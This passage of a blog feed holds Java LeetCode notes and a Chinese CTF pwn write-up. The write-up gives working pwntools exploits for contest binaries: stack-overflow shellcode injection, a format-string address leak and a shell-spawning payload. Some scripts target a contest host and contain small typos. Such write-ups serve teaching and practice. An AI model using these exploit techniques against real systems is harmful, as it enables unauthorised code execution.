    <summary type="html">&lt;h4 id=&quot;二叉树的最大深度&quot;&gt;&lt;a href=&quot;#二叉树的最大深度&quot; class=&quot;headerlink&quot; title=&quot;二叉树的最大深度&quot;&gt;&lt;/a&gt;二叉树的最大深度&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/max</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>2024CUDSEC新生赛</title>
    <link href="https://yubut.github.io/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
    <id>https://yubut.github.io/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/</id>
    <published>2024-11-09T04:48:37.000Z</published>
    <updated>2024-11-09T08:12:28.340Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CUDSEC——第七届”玄武杯”Pwn方向WP"><a href="#CUDSEC——第七届”玄武杯”Pwn方向WP" class="headerlink" title="CUDSEC——第七届”玄武杯”Pwn方向WP"></a>CUDSEC——第七届”玄武杯”Pwn方向WP</h4><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h3><p>签到题没什么好说的 flag写在程序里 拖进IDA秒.</p><h3 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h3><p>算加强版签到了 运行程序看到<br><img src="/../imgs/2024-10/image-20241109125426328.png" alt="image-20241109125426328"></p><p>提示给了shell 那是提供了后门的（进IDA分析也能看到）<br>直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/../imgs/2024-10/image-20241109125715321.png" alt="image-20241109125715321"></p><p>打远程加上flag查看就好了.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p>如果说为什么出这个感觉不沾边 问就是之前给新同学们布置过相关学习任务 考察一下（欢迎非预期的佬们交流~</p><h3 id="only-chance"><a href="#only-chance" class="headerlink" title="only_chance"></a>only_chance</h3><p>这题有学弟卡在第二次地址接收 其实主要还是栈的工作原理理解的不是特别透彻（反思ing</p><p>运行其实就有提示没有后门怎么搞 八成要自己构造shellcode多打几次<br>IDA分析发现gets s的大小是280 这里就可以利用栈溢出重定向到main进行第二次程序运行执行shellcode<br>使用NOP sled确保在返回到 shellcode 时，即使位置偏移，程序也会“滑行”到有效的指令区域（2048也111）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;arm64&#x27;</span>, os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">1</span></span><br><span class="line">offset = <span class="number">280</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] main_addr:&#x27;</span>, <span class="built_in">hex</span>(main))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] offest:&#x27;</span>, <span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload1， ret到main头，获取第二次输入机会</span></span><br><span class="line">payload1 = offset * <span class="string">b&#x27;a&#x27;</span> + p64(main)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"><span class="comment"># = remote(&#x27;127.0.0.1&#x27;,8888)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;where are them\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取栈顶地址</span></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;[+] stack:&#x27;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span>   <span class="comment"># 先填充nop链</span></span><br><span class="line">payload2 += shellcode       <span class="comment"># 执行shellcode</span></span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="built_in">len</span>(shellcode) - <span class="number">0x50</span>)     <span class="comment"># 填充完剩余栈区</span></span><br><span class="line">payload2 += p64(stack)      <span class="comment"># ret: 回到栈顶，开始执行</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也有师傅是shellcode接受栈地址 然后控制程序流执行到shellcode 就可以拿到shell了 比我这个精简多了.下附R师傅的思路.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process(&#x27;./one_chance&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">49494</span>)</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./one_chance&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401463</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(<span class="number">0x404500</span>)+p64(ret)+p64(<span class="number">0x401360</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(stack))</span><br><span class="line">shell=shellcraft.sh()</span><br><span class="line">shell=asm(shell)</span><br><span class="line">payload=shell.ljust(<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>如果你是2048高手 那这题真的就是送了 但是感觉有点遗憾 没有很多师傅的反馈呜呜（也可能是有些师傅觉得太easy不屑一顾hh 🤩<br>其实主要是一个非预期填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xt.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./p2048&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">22770</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;z&#x27;</span> * (<span class="number">1024</span> + <span class="number">28</span>)  + <span class="string">b&#x27;\n&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;w&#x27;</span><span class="comment">#非预期填充</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>Hint是栈和格式化字符串 需要debug<br>貌似这题存在些疑问 希望有问题的师傅可以下来一起交流（lose 我是菜菜fw</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,40454)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;CUDSEC——第七届”玄武杯”Pwn方向WP&quot;&gt;&lt;a href=&quot;#CUDSEC——第七届”玄武杯”Pwn方向WP&quot; class=&quot;headerlink&quot; title=&quot;CUDSEC——第七届”玄武杯”Pwn方向WP&quot;&gt;&lt;/a&gt;CUDSEC——第七届”玄武杯”P</summary>
      
    
    
    
    <category term="二进制安全" scheme="https://yubut.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="pwn" scheme="https://yubut.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x1</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x1/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x1/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-26T05:45:26.431Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>link：<a href="https://leetcode.cn/problems/binary-search/description/">704. 二分查找 - 力扣（LeetCode）</a><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240923152617533.png" alt="image-20240923152617533"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出数组升序 ，想到二分查找（好吧其实题目也给出来了w）<br>找到mid，根据逻辑大小缩小范围比较.</p><h6 id="全包围-lefg-right"><a href="#全包围-lefg-right" class="headerlink" title="全包围[lefg,right]"></a>全包围[lefg,right]</h6><p>假如数组大小为6，取值范围就是[0,5].闭区间使得定义left &#x3D; 0，right &#x3D; nums.length-1（防止越界指针无效，也是根据此处可以反推没有左开右闭情况）<br>left指针是0.right是5，这个时候left &#x3D;&#x3D; right是有效的，结束条件也就是left&lt;&#x3D;right，再根据mid位置进行判断，target是再mid左边还是右边或者是幸运的查找到目标位置.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//看到数组习惯性反应越界问题</span></span><br><span class="line">        <span class="comment">//闭区间</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="左闭右开-left-rigjht"><a href="#左闭右开-left-rigjht" class="headerlink" title="左闭右开[left,rigjht)"></a>左闭右开[left,rigjht)</h6><p>同样的条件但是right指针指向nums.length，对应的left &#x3D;&#x3D; right没有意义.所以判断条件是left &lt; right.如果target在nums[mid]左边的话，把left赋值为mid+1，但是反过来<strong>target在nums[mid]右边的话，就要赋值left为mid</strong>【右边开mid指的指针不参加下一次循环判读】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="全开-left-right"><a href="#全开-left-right" class="headerlink" title="全开(left,right)"></a>全开(left,right)</h6><p>分析同上述 只不过全开两种情况都赋值为mid.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left + <span class="number">1</span> &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p><strong>1.区间问题，判断条件是否能遍历所有下标.</strong><br><strong>2.其实将mid取值方法改成left+((right-left)&gt;&gt;1)【和 &#x2F; 2一样】是最好的，直接用（left+right）&#x2F; 2和（left+right）&#x2F;&#x2F; 2 【向下取整】 只适用于少数据全包围情况，此情况left和right都是int范围，取值范围是-2147483648-2147483647，当两个数值很接近边界值的时候相加很容易出现负值</strong><br><strong>3.（right-left ）&#x2F; 2 只是表示了left和right指针之间距离的一半，不能表示mid所在的位置，用left加上距离的一半刚好能进行表示.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二分查找&quot;&gt;&lt;a href=&quot;#二分查找&quot; class=&quot;headerlink&quot; title=&quot;二分查找&quot;&gt;&lt;/a&gt;二分查找&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/binary-search/descr</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x10</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x10/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x10/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:24:15.675Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉树的层序遍历（广度优先遍历）"><a href="#二叉树的层序遍历（广度优先遍历）" class="headerlink" title="二叉树的层序遍历（广度优先遍历）"></a>二叉树的层序遍历（广度优先遍历）</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/description/">102. 二叉树的层序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目说明从左往右进行遍历，其实可以堪称给二叉树每一层都画横线分割开来，left first，right last.</p><p><img src="/../imgs/2024-10/image-20241108151829868.png" alt="image-20241108151829868"></p><p>n代表null 输出只从存在的节点中输出.<br>最先想到的就是递归，按照创建树的思路，pass掉空节点就好.<br>先前做过队列模拟栈，其实这里用队列来解决也很优雅.</p><h6 id="队列BFS"><a href="#队列BFS" class="headerlink" title="队列BFS"></a>队列BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//获取当前队列的大小</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                tmp.add(cur.val);</span><br><span class="line">                size--;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>高度:二叉树中任意一个节点到叶子结点的距离<br>深度:二叉树中任意一个节点到<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E8%8A%82%E7%82%B9&spm=1001.2101.3001.7020">根节点</a>的距离</p><p><strong><code>List&lt;List&lt;Integer&gt;&gt;</code> 的必要性</strong></p><p>每一层的节点值需要单独存储在一个列表中，然后将所有层的列表整合在一个大列表中。因此，最终结果需要一个嵌套的列表结构。</p><h4 id="反转二叉树"><a href="#反转二叉树" class="headerlink" title="反转二叉树"></a>反转二叉树</h4><p>link：<a href="https://leetcode.cn/problems/invert-binary-tree/description/">226. 翻转二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题意，看到的是左右子树内部交换自身孩子节点，然后左右子树又进行了交换.<br>递归交换就秒了.<br>其实可以老老实实的逐个左右交换，也可以按照上一题层序遍历的一层层交换（观察到最后一层是1，3，6，9——&gt;9，6，3，1）</p><h6 id="DFS（递归）"><a href="#DFS（递归）" class="headerlink" title="DFS（递归）"></a>DFS（递归）</h6><p>注意前序遍历和后序遍历可以，中序遍历不行（不信你就画图推推看）<br>前序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left= root.right ;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        